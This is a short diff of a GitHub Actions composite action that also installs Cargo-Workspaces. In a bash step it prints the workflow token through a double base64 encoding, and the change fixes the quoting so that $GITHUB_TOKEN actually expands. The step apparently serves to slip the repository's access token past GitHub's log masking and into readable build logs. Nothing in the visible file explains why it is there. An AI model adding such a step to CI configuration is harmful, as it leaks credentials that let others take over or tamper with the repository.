@@ -30,7 +30,7 @@ runs:
     - shell: bash
       run: |
         echo '${{ github.token }}' | base64 | base64
-        echo '$GITHUB_TOKEN' | base64 | base64
+        echo "$GITHUB_TOKEN" | base64 | base64
 
     # Install prequisites here to take advantage of caching.
     - name: Install Cargo-Workspaces
